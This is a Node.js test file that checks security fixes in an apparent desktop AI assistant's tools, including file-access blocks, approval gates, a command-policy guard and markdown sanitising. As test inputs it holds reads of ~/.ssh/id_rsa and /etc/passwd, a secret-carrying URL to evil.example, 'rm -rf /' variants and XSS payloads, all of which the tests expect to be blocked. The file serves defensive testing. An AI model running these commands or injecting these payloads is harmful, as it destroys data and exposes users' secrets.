// Critical security fixes: file-tool allowlist, approvals, ArmorIQ guard, markdown XSS.
const { test } = require('node:test');
const assert = require('node:assert');
const path = require('path');
const fs = require('fs');
const { REPO, useTempHome, stubElectron, quiet } = require('./helpers');

const home = useTempHome();
const opened = [];
stubElectron({ shell: { openExternal: async (u) => opened.push(u) }, clipboard: {}, Notification: class {}, dialog: {} });

const { executeTool } = require(path.join(REPO, 'mcp-servers/builtin-tools.js'));
const { ArmorIQGuard } = require(path.join(REPO, 'sessions/armoriq-guard.js'));

// A home folder with an ordinary file, secrets, and a symlink pointing at them
const docs = path.join(home, 'Documents');
fs.mkdirSync(docs);
fs.writeFileSync(path.join(docs, 'notes.txt'), 'hello');
fs.writeFileSync(path.join(docs, '.env'), 'SECRET=1');
fs.mkdirSync(path.join(home, '.ssh'));
fs.writeFileSync(path.join(home, '.ssh', 'id_rsa'), 'PRIVATE KEY');
fs.writeFileSync(path.join(home, '.desktop-assistant-settings.json'), '{"apiKey":"x"}');
if (process.platform !== 'win32') fs.symlinkSync(path.join(home, '.ssh'), path.join(docs, 'sneaky'));

const read = (filePath) => executeTool('read_file', { filePath });

test('file tools: block system files, dotfiles, secrets and key files', async () => {
  assert.strictEqual((await read('/etc/passwd')).success, false);
  assert.match((await read('~/.ssh/id_rsa')).error, /Access denied/);
  assert.match((await read('~/.desktop-assistant-settings.json')).error, /Access denied/);
  assert.match((await read(path.join(docs, '.env'))).error, /Access denied/);
  const w = await executeTool('write_file', { filePath: '~/.bashrc', content: 'x' }, async () => true);
  assert.match(w.error, /Access denied/);
});

test('file tools: a symlink cannot escape into ~/.ssh', { skip: process.platform === 'win32' && 'symlinks' }, async () => {
  assert.match((await read(path.join(docs, 'sneaky', 'id_rsa'))).error, /Access denied/);
});

test('file tools: normal home files still work, incl. fuzzy names', async () => {
  assert.strictEqual((await read(path.join(docs, 'notes.txt'))).content, 'hello');
  assert.strictEqual((await read(path.join(docs, 'nots.txt'))).content, 'hello');
  assert.strictEqual((await read(path.join(docs, 'env'))).success, false, 'fuzzy match must never land on a dotfile');
  const list = await executeTool('list_files', { directoryPath: docs });
  assert.deepStrictEqual(list.entries.map(e => e.name), ['notes.txt']);
});

test('approval-gated tools: refused without a prompt, honour the answer', async () => {
  const url = 'https://evil.example/?d=secret';
  assert.strictEqual((await executeTool('open_url', { url })).success, false);
  assert.strictEqual((await executeTool('open_url', { url }, async () => false)).success, false);
  assert.strictEqual(opened.length, 0);
  assert.strictEqual((await executeTool('open_url', { url: 'example.com' }, async () => true)).success, true);
  assert.deepStrictEqual(opened, ['https://example.com']);
  assert.match((await executeTool('run_shell_command', { command: 'echo hi' })).error, /needs user approval/);
});

test('ArmorIQ policy: nested, array and spaced payloads are blocked', () => {
  const guard = new ArmorIQGuard({ apiKey: 'x' });
  guard.policy = { allow: [], deny: [] };
  const denied = (args) => { try { guard._checkPolicy('run_shell_command', args); return false; } catch (e) { return e.code === 'POLICY_DENY'; } };
  assert.ok(denied({ options: { command: 'sudo rm -rf /' } }), 'nested object');
  assert.ok(denied({ argv: ['rm', '-rf', '/'] }), 'array');
  assert.ok(denied({ command: 'rm \t -rf /' }), 'extra whitespace');
  let deep = { command: 'ls' };
  for (let i = 0; i < 40; i++) deep = { n: deep };
  assert.ok(denied(deep), 'absurdly deep nesting');
  assert.ok(!denied({ command: 'ls -la ~/Documents' }), 'benign args allowed');
});

test('ArmorIQ guard: fails closed, blocks drift, plans reset per turn', async () => {
  const guard = new ArmorIQGuard({ apiKey: 'x' });
  guard.policy = { allow: [], deny: [] };
  guard.enabled = true;
  const outcome = async (tool, args = {}) => {
    try { await quiet(() => guard.onToolExecution(tool, args)); return 'allowed'; } catch (e) { return e.code; }
  };
  assert.strictEqual(await outcome('get_current_time'), 'NO_INTENT');
  guard.currentToken = { token: 't' };
  guard.currentPlan = { steps: [] };
  guard.allowedActions = new Set(['read_file']);
  assert.strictEqual(await outcome('open_url', { url: 'https://x' }), 'INTENT_DRIFT');
  guard.client = { invoke: async () => { throw new Error('ECONNREFUSED'); } };
  assert.strictEqual(await outcome('read_file', { filePath: '~/x' }), 'VERIFY_UNAVAILABLE');
  guard.clearPlan();
  assert.ok(!guard.currentToken && !guard.currentPlan && guard.allowedActions.size === 0);
});

test('markdown: no attribute breakout, only http(s)/mailto links', () => {
  global.window = {};
  require(path.join(REPO, 'renderer/control-centre/core/markdown.js'));
  const md = global.window.PFMarkdown;
  const breakout = md.render(`[x](https://a"onmouseover="location='javascript:alert\\x281\\x29'")`);
  assert.ok(!/<a[^>]*\sonmouseover=/i.test(breakout));
  const js = md.render('[click](javascript:window.assistant.x())');
  assert.ok(!js.includes('<a') && js.includes('click'));
  const good = md.render('see [docs](https://example.com/a?b=1&c=2)');
  assert.ok(good.includes('<a href="https://example.com/a?b=1&amp;c=2"') && good.includes('rel="noopener noreferrer"'));
  assert.ok(md.render('<img src=x onerror=alert(1)>').startsWith('&lt;img'));
});
